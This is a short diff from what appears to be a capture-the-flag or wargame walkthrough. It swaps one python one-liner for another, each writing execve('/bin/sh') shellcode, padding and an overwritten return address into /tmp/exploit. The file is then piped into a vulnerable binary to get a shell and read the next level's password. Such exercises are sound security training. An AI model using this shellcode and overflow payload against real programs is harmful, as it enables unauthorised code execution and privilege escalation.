@@ -32,7 +32,7 @@ mv ft_level2 ~
 # Then you have to run the program and cat .pass as level2 by taping manually these commands
 
 #	su level2
-# // the new return address of malloc() function is 0x0804b008
-#	python -c "print '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80' + 'a' * 54 + '\x08\xb0\x04\x08'" >/tmp/exploit
+#	// the new return address of malloc() function is 0x0804b008
+#	python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xb0\x04\x08"' > /tmp/exploit
 #	cat /tmp/exploit - | /home/user/level3/ft_level2
 #	cat /home/user/level3/.pass
